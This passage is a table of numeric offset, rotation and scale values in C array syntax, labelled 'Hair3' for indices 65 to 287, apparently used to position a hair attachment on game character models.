	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 65
	{0.095307, 0.009252, 0.000018, 0.000000, 0.000000, 4.176807, 1.004458, 1.004458, 1.051705 }, // Hair3 - 66
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 67
	{0.101020, 0.016734, -0.003369, 0.000000, 0.000000, 4.176807, 1.004458, 1.004458, 0.997687 }, // Hair3 - 68
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 69
	{0.087212, 0.017980, 0.007104, 0.000000, 0.000000, 4.176807, 1.004458, 1.004458, 1.049646 }, // Hair3 - 70
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 71
	{0.089513, 0.014271, -0.001790, 0.000000, 0.000000, 4.176807, 1.004458, 1.004458, 1.032754 }, // Hair3 - 72
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 73
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 74
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 75
	{0.077374, -0.010765, 0.002583, 0.000000, 0.000000, 4.176807, 1.004458, 1.004458, 1.166910 }, // Hair3 - 76
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 77
	{0.079938, 0.012189, 0.002583, 0.000000, 0.000000, 4.176807, 1.004458, 1.004458, 1.166910 }, // Hair3 - 78
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 79
	{0.076820, -0.014839, 0.002583, 0.000000, 0.000000, 350.695648, 1.004458, 1.004458, 1.071538 }, // Hair3 - 80
	{0.076820, -0.014839, 0.002583, 0.000000, 0.000000, 350.695648, 1.004458, 1.004458, 1.071538 }, // Hair3 - 81
	{0.104624, 0.014979, 0.002583, 0.000000, 0.000000, 356.442108, 1.004458, 1.004458, 1.141624 }, // Hair3 - 82
	{0.093609, 0.006488, 0.002583, 0.000000, 0.000000, 356.442108, 1.004458, 1.004458, 1.141624 }, // Hair3 - 83
	{0.106974, 0.006488, 0.002583, 0.000000, 0.000000, 356.442108, 1.004458, 1.004458, 1.141624 }, // Hair3 - 84
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 85
	{0.070000, -0.009999, 0.000000, 0.000000, 0.000000, 350.000000, 1.200000, 1.200000, 1.100000 }, // Hair3 - 86
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 87
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 88
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 89
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 90
	{0.076668, -0.010447, -0.003085, 0.000000, 0.000000, 3.968300, 1.004458, 1.004458, 1.169261 }, // Hair3 - 91
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 92
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 93
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 94
	{0.070631, -0.016430, 0.000185, 0.000000, 0.000000, 3.968300, 1.004458, 1.004458, 1.079532 }, // Hair3 - 95
	{0.085213, 0.007071, -0.002542, 0.000000, 0.000000, 3.968300, 1.004458, 1.004458, 1.094804 }, // Hair3 - 96
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 97
	{0.081412, 0.025877, 0.000684, 0.000000, 0.000000, 3.968300, 1.004458, 1.004458, 1.156216 }, // Hair3 - 98
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 99
	{0.096130, -0.002822, 0.002127, 0.000000, 0.000000, 358.993652, 1.004458, 1.004458, 1.156216 }, // Hair3 - 100
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 101
	{0.088931, 0.009656, -0.003107, 0.000000, 0.000000, 358.993652, 1.004458, 1.004458, 1.042739 }, // Hair3 - 102
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 103
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 104
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 105
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 106
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 107
	{0.111707, 0.012517, 0.000836, 1.349158, 0.000000, 349.588562, 1.004458, 1.004458, 0.861656 }, // Hair3 - 108
	{0.111707, 0.024860, 0.000836, 1.349158, 0.000000, 355.732360, 1.004458, 1.004458, 0.893029 }, // Hair3 - 109
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 110
	{0.091159, 0.003268, -0.001098, 1.349158, 0.000000, 359.983459, 1.004458, 1.004458, 1.003022 }, // Hair3 - 111
	{0.083389, 0.004525, -0.001098, 1.349158, 0.000000, 6.963862, 1.004458, 1.004458, 0.915353 }, // Hair3 - 112
	{0.098555, -0.000253, -0.001098, 1.349158, 0.000000, 2.182152, 1.004458, 1.004458, 1.080508 }, // Hair3 - 113
	{0.105434, 0.007519, -0.003082, 1.349158, 0.000000, 3.462919, 1.004458, 1.004458, 0.996621 }, // Hair3 - 114
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 115
	{0.105434, 0.007519, -0.003082, 1.349158, 0.000000, 3.462919, 1.004458, 1.004458, 0.996621 }, // Hair3 - 116
	{0.073719, 0.011567, -0.001081, 1.349158, 0.000000, 358.537384, 1.004458, 1.004458, 1.053219 }, // Hair3 - 117
	{0.078061, 0.011567, -0.001081, 1.349158, 0.000000, 2.812902, 1.004458, 1.004458, 1.053219 }, // Hair3 - 118
	{0.070000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.200000, 1.200000, 1.100000 }, // Hair3 - 119
	{0.088413, -0.004958, -0.001081, 1.349158, 0.000000, 356.769927, 1.004458, 1.004458, 1.134856 }, // Hair3 - 120
	{0.098040, -0.013431, 0.000846, 1.349158, 0.000000, 352.953826, 1.004458, 1.004458, 1.165797 }, // Hair3 - 121
	{0.097684, -0.008173, 0.000846, 1.349158, 0.000000, 352.953826, 1.004458, 1.004458, 1.069886 }, // Hair3 - 122
	{0.082243, -0.000975, -0.003736, 1.349158, 0.000000, 352.953826, 1.004458, 1.004458, 1.270665 }, // Hair3 - 123
	{0.083105, -0.000273, -0.001209, 1.349158, 0.000000, 352.953826, 1.004458, 1.004458, 1.167312 }, // Hair3 - 124
	{0.089598, 0.003350, -0.001209, 1.349158, 0.000000, 7.936543, 1.004458, 1.004458, 1.055302 }, // Hair3 - 125
	{0.107306, -0.014673, 0.000547, 1.162765, 0.000000, 0.930281, 1.004458, 1.004458, 1.133381 }, // Hair3 - 126
	{0.097297, 0.002157, 0.000547, 1.162765, 0.000000, 356.993957, 1.004458, 1.004458, 1.132299 }, // Hair3 - 127
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 128
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 129
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 130
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 131
	{-0.000896, 0.005557, 0.000547, 1.162765, 0.000000, 349.529785, 1.004458, 1.004458, 0.975846 }, // Hair3 - 132
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 133
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 134
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 135
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 136
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 137
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 138
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 139
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 140
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 141
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 142
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 143
	{0.089415, -0.005394, -0.003360, 1.162765, 0.000000, 354.949035, 1.004458, 1.004458, 1.377530 }, // Hair3 - 144
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 145
	{0.084664, -0.005025, -0.003360, 1.162765, 0.000000, 354.949035, 1.004458, 1.004458, 1.063808 }, // Hair3 - 146
	{0.068039, -0.006231, 0.003438, 1.162765, 0.000000, 348.373596, 1.004458, 1.004458, 1.091637 }, // Hair3 - 147
	{0.077481, -0.006293, 0.003438, 1.162765, 0.000000, 3.232684, 1.004458, 1.004458, 1.143243 }, // Hair3 - 148
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 149
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 150
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 151
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 152
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 153
	{0.061059, -0.000941, 0.003438, 1.162765, 0.000000, 354.961517, 1.004458, 1.004458, 1.064656 }, // Hair3 - 154
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 155
	{0.088869, -0.006497, 0.003438, 1.162765, 0.000000, 354.961517, 1.004458, 1.004458, 1.322631 }, // Hair3 - 156
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 157
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 158
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 159
	{0.080472, -0.006497, 0.000619, 1.162765, 0.000000, 354.961517, 1.004458, 1.004458, 1.024554 }, // Hair3 - 160
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 161
	{0.099750, -0.004397, 0.000619, 1.162765, 0.000000, 357.063781, 1.004458, 1.004458, 1.093557 }, // Hair3 - 162
	{0.085568, -0.002210, -0.000876, 1.162765, 0.000000, 353.987701, 1.004458, 1.004458, 1.017031 }, // Hair3 - 163
	{0.085617, -0.002210, -0.000876, 1.162765, 0.000000, 353.987701, 1.004458, 1.004458, 1.017031 }, // Hair3 - 164
	{0.076236, 0.004471, -0.000876, 1.162765, 0.000000, 353.987701, 1.004458, 1.004458, 1.126474 }, // Hair3 - 165
	{0.076236, 0.004471, -0.000876, 1.162765, 0.000000, 353.987701, 1.004458, 1.004458, 1.126474 }, // Hair3 - 166
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 167
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 168
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 169
	{0.082516, 0.004471, -0.000876, 1.162765, 0.000000, 356.341644, 1.004458, 1.004458, 1.126474 }, // Hair3 - 170
	{0.095091, -0.004251, -0.000876, 1.162765, 0.000000, 356.341644, 1.004458, 1.004458, 1.145727 }, // Hair3 - 171
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 172
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 173
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 174
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 175
	{0.110327, -0.012279, -0.003095, 1.162765, 0.000000, 353.170532, 1.004458, 1.004458, 1.138159 }, // Hair3 - 176
	{0.096507, -0.004908, -0.003095, 1.162765, 0.000000, 353.170532, 1.004458, 1.004458, 1.256144 }, // Hair3 - 177
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 178
	{0.093613, 0.001893, -0.003095, 1.162765, 0.000000, 355.963073, 1.004458, 1.004458, 1.097507 }, // Hair3 - 179
	{0.097174, -0.011787, -0.003095, 1.162765, 0.000000, 355.963073, 1.004458, 1.004458, 1.176252 }, // Hair3 - 180
	{0.098671, 0.026786, -0.000061, 1.162765, 0.000000, 355.963073, 1.004458, 1.004458, 1.074810 }, // Hair3 - 181
	{0.077510, 0.012967, -0.000061, 1.162765, 0.000000, 1.151019, 1.004458, 1.004458, 1.132787 }, // Hair3 - 182
	{0.086433, 0.000554, -0.000061, 1.162765, 0.000000, 1.151019, 1.004458, 1.004458, 1.167121 }, // Hair3 - 183
	{0.101167, -0.003799, -0.001940, 1.162765, 0.000000, 0.578940, 1.004458, 1.004458, 1.100660 }, // Hair3 - 184
	{0.088131, -0.001998, -0.001940, 1.162765, 0.000000, 0.578940, 1.004458, 1.004458, 1.100660 }, // Hair3 - 185
	{0.101592, -0.012444, -0.001830, 1.162765, 0.000000, 0.578940, 1.004458, 1.004458, 1.129892 }, // Hair3 - 186
	{0.079601, -0.016813, 0.007176, 1.162765, 0.000000, 355.034423, 1.004458, 1.004458, 1.090405 }, // Hair3 - 187
	{0.090677, -0.000343, 0.002180, 1.162765, 0.000000, 355.034423, 1.004458, 1.004458, 1.055292 }, // Hair3 - 188
	{0.095982, -0.001331, 0.002180, 1.162765, 0.000000, 357.113464, 1.004458, 1.004458, 1.142861 }, // Hair3 - 189
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 190
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 191
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 192
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 193
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 194
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 195
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 196
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 197
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 198
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 199
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 200
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 201
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 202
	{0.087364, 0.004175, -0.001923, 1.162765, 0.000000, 357.113464, 1.004458, 1.004458, 1.105261 }, // Hair3 - 203
	{0.087364, 0.004175, -0.001923, 1.162765, 0.000000, 357.113464, 1.004458, 1.004458, 1.105261 }, // Hair3 - 204
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 205
	{0.110781, 0.006567, -0.001923, 1.162765, 0.000000, 357.113464, 1.004458, 1.004458, 1.007790 }, // Hair3 - 206
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 207
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 208
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 209
	{0.082535, -0.005237, -0.001923, 1.162765, 0.000000, 357.113464, 1.004458, 1.004458, 0.995132 }, // Hair3 - 210
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 211
	{0.062871, -0.001359, -0.001923, 1.162765, 0.000000, 357.113464, 1.004458, 1.004458, 1.048056 }, // Hair3 - 212
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 213
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 214
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 215
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 216
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 217
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 218
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 219
	{0.059144, 0.013152, -0.001230, 1.162765, 0.000000, 357.113464, 1.004458, 1.004458, 1.073572 }, // Hair3 - 220
	{0.094527, -0.006164, 0.002706, 1.162765, 0.000000, 357.113464, 1.004458, 1.004458, 1.247534 }, // Hair3 - 221
	{0.094527, -0.011945, 0.002706, 1.162765, 0.000000, 357.113464, 1.004458, 1.004458, 1.226916 }, // Hair3 - 222
	{0.089071, 0.014463, 0.002706, 1.162765, 0.000000, 357.113464, 1.004458, 1.004458, 1.192765 }, // Hair3 - 223
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 224
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 225
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 226
	{0.101175, 0.014766, 0.002706, 1.162765, 0.000000, 357.113464, 1.004458, 1.004458, 1.126656 }, // Hair3 - 227
	{0.092572, 0.007272, 0.002706, 1.162765, 0.000000, 357.113464, 1.004458, 1.004458, 1.235207 }, // Hair3 - 228
	{0.079486, -0.015010, 0.000872, 1.162765, 0.000000, 350.970611, 1.004458, 1.004458, 1.098212 }, // Hair3 - 229
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 230
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 231
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 232
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 233
	{0.078231, -0.017629, 0.000872, 1.162765, 0.000000, 351.789215, 1.004458, 1.004458, 1.018379 }, // Hair3 - 234
	{0.049378, -0.001035, 0.000872, 1.162765, 0.000000, 348.162139, 1.004458, 1.004458, 0.966751 }, // Hair3 - 235
	{0.080933, -0.007481, 0.000872, 1.162765, 0.000000, 348.162139, 1.004458, 1.004458, 1.095109 }, // Hair3 - 236
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 237
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 238
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 239
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 240
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 241
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 242
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 243
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 244
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 245
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 246
	{0.087829, -0.001369, 0.000872, 1.162765, 0.000000, 3.899056, 1.004458, 1.004458, 1.201375 }, // Hair3 - 247
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 248
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 249
	{0.078370, 0.009865, 0.000872, 1.162765, 0.000000, 352.236450, 1.004458, 1.004458, 1.166651 }, // Hair3 - 250
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 251
	{0.088582, -0.006075, 0.000872, 1.162765, 0.000000, 352.236450, 1.004458, 1.004458, 1.210478 }, // Hair3 - 252
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 253
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 254
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 255
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 256
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 257
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 258
	{0.072341, -0.001438, 0.002612, 1.162765, 0.000000, 352.128753, 1.004458, 1.004458, 1.218888 }, // Hair3 - 259
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 260
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 261
	{0.075398, 0.005842, 0.002612, 1.162765, 0.000000, 357.731414, 1.004458, 1.004458, 1.057977 }, // Hair3 - 262
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 263
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 264
	{0.074374, -0.003570, 0.002612, 1.162765, 0.000000, 353.925384, 1.004458, 1.004458, 1.109009 }, // Hair3 - 265
	{0.080137, -0.009302, 0.002612, 1.162765, 0.000000, 353.925384, 1.004458, 1.004458, 1.131146 }, // Hair3 - 266
	{0.067543, 0.001360, 0.002612, 1.162765, 0.000000, 349.140075, 1.004458, 1.004458, 1.146864 }, // Hair3 - 267
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 },  // Hair3 - 269
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 },  // Hair3 - 269
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 },  // Hair3 - 270
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 },  // Hair3 - 271
	{0.084866, 0.000078, 0.002612, 1.162765, 0.000000, 350.338287, 1.004458, 1.004458, 1.146864 }, // Hair3 - 272
	{0.059999, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.200000, 1.200000, 1.100000 }, // Hair3 - 273
	{0.082516, 0.006275, 0.002612, 1.162765, 0.000000, 350.338287, 1.004458, 1.004458, 1.090817 }, // Hair3 - 274
	{0.088237, 0.005707, -0.000952, 1.162765, 0.000000, 354.032653, 1.004458, 1.004458, 1.042391 }, // Hair3 - 275
	{0.093156, 0.002306, -0.000952, 1.162765, 0.000000, 357.562286, 1.004458, 1.004458, 0.996686 }, // Hair3 - 276
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 277
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 278
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 279
	{0.089934, 0.005118, -0.000952, 1.162765, 0.000000, 354.893707, 1.004458, 1.004458, 1.037778 }, // Hair3 - 280
	{0.089934, 0.005118, -0.000952, 1.162765, 0.000000, 354.893707, 1.004458, 1.004458, 1.037778 }, // Hair3 - 281
	{0.084915, 0.003095, -0.000952, 1.162765, 0.000000, 354.893707, 1.004458, 1.004458, 1.104662 }, // Hair3 - 282
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 283
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 284
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 285
	{0.086468, 0.001470, -0.000952, 1.162765, 0.000000, 354.893707, 1.004458, 1.004458, 1.092748 }, // Hair3 - 286
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 287
